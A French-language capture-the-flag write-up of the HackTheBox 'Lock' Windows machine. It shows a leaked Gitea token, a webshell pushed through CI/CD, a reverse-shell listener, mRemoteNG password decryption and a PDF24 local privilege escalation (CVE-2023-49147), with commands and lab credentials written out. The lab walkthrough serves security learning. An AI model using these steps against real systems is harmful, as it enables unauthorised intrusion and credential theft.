---
title: Lock
date: 2025-12-11 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Easy", "Windows", "Active Directory", "CVE-2023-49147", "Gitea"]
---

Lock est une machine Windows de difficulté facile qui consiste à parcourir un dépôt **Gitea** pour trouver un jeton d'accès personnel. Ce jeton est ensuite utilisé pour déployer un **webshell ASPX** sur le serveur, ce qui permet d'établir un premier point d'entrée. Un mot de passe est ensuite déchiffré à partir d'un fichier de configuration **mRemoteNG**, donnant accès à un nouveau compte utilisateur. Enfin, une vulnérabilité d'élévation de privilèges locale dans l'application **`PDF24`** est exploitée pour obtenir un shell avec les privilèges SYSTEM.

# Énumération
## Nmap

Je lance un scan tcp complet.
```sh
rustscan -a 10.129.234.64 -u 5000 -- -sV -sC
```

Le scan révèle 4 ports ouverts : HTTP (80), SMB (445), HTTP (3000) et RDP (3389).
```shell
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: Lock - Index
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds? syn-ack ttl 127
3000/tcp open  ppp?          syn-ack ttl 127
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=d6a9bdfe1fd45bf8; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=uBfq42FCCVXKIP_QHZCr1lAuh4A6MTc2MTU5MjA4NzYwNTQyODIwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 27 Oct 2025 19:08:08 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=a585955febfa99ab; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=UTMtZoVWiFIolRWbKKQRXGH9jSc6MTc2MTU5MjA5Mzk1ODg1NzkwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 27 Oct 2025 19:08:13 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2025-10-27T19:10:11+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-27T19:09:31+00:00
| ssl-cert: Subject: commonName=Lock
| Issuer: commonName=Lock
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-26T19:04:17
| Not valid after:  2026-04-27T19:04:17
| MD5:   c6ed4248d4dd03c44acea384598406b2
| SHA-1: f42aab4b696e9903722fdf37c52486e884a90ab7
```

## HTTP - TCP 80

![](/images/Lock/Lock-1.png)

## HTTP - TCP 3000

Le port **3000** héberge une instance Gitea.
![](/images/Lock/Lock-2.png)

Avec l'extension `Wappalyzer`, je vois qu'il s'agit d'un site `ASP.NET`.
![](/images/Lock/Lock-10.png)

Dans l'onglet Explore, se trouve un repo `dev-scripts` appartenant à l'utilisateur `ellen.freeman`.
![](/images/Lock/Lock-3.png)

Je vois qu'il n'y a que deux utilisateurs Gitea.
![](/images/Lock/Lock-4.png)

Le repo contient un script python.
![](/images/Lock/Lock-5.png)

Ce script sert à lister les repos d'une instance Gitea. Mais pour cela, il utilise la variable d'environnement `GITEA_ACCESS_TOKEN`.
```python
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)

    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

Je vois qu'il y a deux commits.
![](/images/Lock/Lock-6.png)

Dans le 1er (`Add repos.py`), se trouve la valeur de la variable d'environnement.
![](/images/Lock/Lock-7.png)

Dans le second commit (`Update repos.py`), je voit que la variable `PERSONAL_ACCESS_TOKEN` a été supprimée.
![](/images/Lock/Lock-8.png)

# Shell en tant que Ellen.Freeman
## Énumérer Gitea

Je crée alors cette variable d'environnement sur ma machine avec sa valeur. Je télécharge aussi le script et je l'exécute. Je vois donc qu'il existe un deuxième repo `website` qui n'est accessible qu'avec cette variable.
```sh
/workspace/Lock
❯ export GITEA_ACCESS_TOKEN='43ce39bb0bd6bc489284f2905f033ca467a6362f'

/workspace/Lock
❯ echo $GITEA_ACCESS_TOKEN
43ce39bb0bd6bc489284f2905f033ca467a6362f

/workspace/Lock
❯ python3 getRepo.py http://10.129.234.64:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```

Je n'ai pas le droit d'accéder directement au repo `website`.
![](/images/Lock/Lock-9.png)

J'utilise alors curl pour accéder au contenu de la page `/api/v1/user/repos` afin d'afficher toutes les informations.
```sh
curl -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" http://10.129.234.64:3000/api/v1/user/repos | jq .
```

Je trouve alors l'emplacement du repo `website`.
```json
},
"name": "website",
"full_name": "ellen.freeman/website",
"description": "",
"empty": false,
"private": true,
"fork": false,
"template": false,
"parent": null,
"mirror": false,
"size": 7370,
"language": "CSS",
"languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/languages",
"html_url": "http://localhost:3000/ellen.freeman/website",
"url": "http://localhost:3000/api/v1/repos/ellen.freeman/website",
"link": "",
"ssh_url": "ellen.freeman@localhost:ellen.freeman/website.git",
"clone_url": "http://localhost:3000/ellen.freeman/website.git",
"original_url": "",
"website": "",
"stars_count": 0,
```

Je clone alors ce repo sur ma machine.
```sh
/workspace/Lock
❯ git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
Cloning into 'website'...
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 1.05 MiB/s, done.
Resolving deltas: 100% (35/35), done.
```

S'y trouvent plusieurs fichiers. C'est le code source du site web sur le port **80**.
```sh
website git:main
❯ ls -al
total 40
drwxrwsr-x 4 root rvm  4096 Dec  7 14:32 .
drwxrws--- 3 root rvm  4096 Dec  7 14:32 ..
drwxrwsr-x 6 root rvm  4096 Dec  7 14:32 assets
-rw-rw-r-- 1 root rvm    43 Dec  7 14:32 changelog.txt
drwxrwsr-x 8 root rvm  4096 Dec  7 14:32 .git
-rw-rw-r-- 1 root rvm 15708 Dec  7 14:32 index.html
-rw-rw-r-- 1 root rvm   130 Dec  7 14:32 readme.md
```

Avec le `readme.md`, j'apprends que la CI/DC est toujours active, nous permettant de pouvoir modifier le contenu du repo à distance.
```sh
website git:main
❯ cat readme.md
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver#                                                
website git:main
❯ cat changelog.txt
# Changelog

- Added first website version
```

## Shell

Vu que le site sur le port **80** est un site `ASP.NET`, j'ajoute au repo un [webshell aspx](https://github.com/grov/webshell/blob/master/webshell-LT.aspx). Puis je l'envoie dans le repo du Gitea.
```sh
website git:main
❯ ls
assets  changelog.txt  index.html  readme.md  webshell-LT.aspx

website git:main
❯ git add webshell-LT.aspx

website git:main*
❯ git commit -m "Ajout du webshell"
Author identity unknown

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: unable to auto-detect email address (got 'root@exegol-htb-labs.(none)')
```

Lorsque je fais le commit, je vois une erreur. Mais rien de grave, il suffit de mettre une adresse email ainsi qu'un username quelconques.
```sh
website git:main*
❯ git config --global user.email z3rodol@lock.vl

website git:main*
❯ git config --global user.name z3rodol

website git:main*
❯ ls
assets  changelog.txt  index.html  readme.md  webshell-LT.aspx

website git:main*
❯ git commit -m "Ajout du webshell"
[main 86b0aea] Ajout 3
 1 file changed, 161 insertions(+)
 create mode 100644 webshell-LT.aspx

website git:main*
❯ git push
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 16 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 2.06 KiB | 2.06 MiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.234.64:3000/ellen.freeman/website.git
   0b7b70c..86b0aea  main -> main
```

Je me rends alors sur le site `http://10.129.234.64/webshell-LT.aspx`.
![](/images/Lock/Lock-11.png)

Je met alors mon payload de reverse shell PowerShell.
![](/images/Lock/Lock-12.png)

J'obtiens alors un shell en tant que `ellen.freeman`.
```powershell
website git:main*  67s
❯ rlwrap nc -lvnp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.234.64.
Ncat: Connection from 10.129.234.64:60044.

PS C:\inetpub\wwwroot> whoami
lock\ellen.freeman
PS C:\inetpub\wwwroot>
```

# Shell en tant que Gale.Dekarios
## Énumération

Dans le répertoire `C:\users\ellen.freeman`, se trouve le fichier `.git-credentials` qui contient les identifiants Gitea de `ellen.freeman`.
```powershell
PS C:\users\ellen.freeman> tree /f
Folder PATH listing
Volume serial number is 8592-A9D9
C:.
?   .git-credentials
?   .gitconfig
?
+---.ssh
?       authorized_keys
?
+---3D Objects
+---Contacts
+---Desktop
+---Documents
?       config.xml
?
+---Downloads
+---Favorites
?   ?   Bing.url
?   ?
?   +---Links
+---Links
?       Desktop.lnk
?       Downloads.lnk
?
+---Music
+---Pictures
+---Saved Games
+---Searches
+---Videos
PS C:\users\ellen.freeman> cat .git-credentials
http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000
```

Le fichier `C:\users\ellen.freeman\Documents\config.xml` contient les identifiants ainsi que la configuration de [mRemoteNG](https://github.com/mRemoteNG/mRemoteNG), un gestionnaire de connexions distantes open source, à onglets et multi protocoles.
```xml
PS C:\users\ellen.freeman> cat Documents/config.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

Il est possible de déchiffrer cet fichier avec l'outil [mRemoteNG_password_decrypt](https://github.com/gquere/mRemoteNG_password_decrypt). S'y trouve alors les identifiants de `Gale.Dekarios`.
```sh
/workspace/Lock
❯ git clone https://github.com/gquere/mRemoteNG_password_decrypt
Cloning into 'mRemoteNG_password_decrypt'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 11 (delta 2), reused 10 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (11/11), done.
Resolving deltas: 100% (2/2), done.

/workspace/Lock
❯ cd mRemoteNG_password_decrypt

/workspace/Lock
❯ cd mRemoteNG_password_decrypt

mRemoteNG_password_decrypt git:master
❯ python3 mremoteng_decrypt.py ../config.xml
Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosXo6
```

## Connexion RDP

Je me connecte alors en RDP et je récupère le premier flag. Je vois aussi un raccourci d'un logiciel **PDF24 Launcher**.
```sh
xfreerdp /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6 /cert-ignore
```
![](/images/Lock/Lock-13.png)

# Shell en tant que nt authority\system
## Énumération 

En recherchant sur Google `pdf24 exploit`, je vois un article de [sec-consult](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/) que cette version est vulnérable. Je trouve le fichier d'installation de `pdf24` dans le répertoire `C:\_install`.
![](/images/Lock/Lock-14.png)

## CVE-2023-49147

Sur ce [GitHub](https://github.com/googleprojectzero/symboliclink-testing-tools/releases), je trouve une version déjà compile de `SetOpLock.exe` permettant de réaliser cette attaque. Dans un premier terminal, j'exécute la commande suivante.
```
./SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

Puis sur un autre, je démarre le fichier d'installation de `pdf24`.
```
msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```

Cela va créer une fenêtre dont je suis les étapes.
![](/images/Lock/Lock-15.png)

A ce stade, je clique sur le lien `legacy console mode` en bas de la fenêtre.
![](/images/Lock/Lock-16.png)

Cela ouvre encore une autre fenêtre nous demandant de choisir un navigateur. Il faut choisir tout navigateur autre que **Microsoft Edge** ou **Internet Explorer**. Moi j'ai choisi **Firefox**.
![](/images/Lock/Lock-17.png)

Une fois Firefox ouvert, il faut effectuer la combinaison **`CTRL+o`**. Une fenêtre s'ouvrira dans laquelle, j'écris `cmd.exe` puis je clique sur **Open**.
![](/images/Lock/Lock-18.png)

J'obtiens alors un shell en tant que `nt authority\system` et je peux récupérer le second flag.
![](/images/Lock/Lock-19.png)
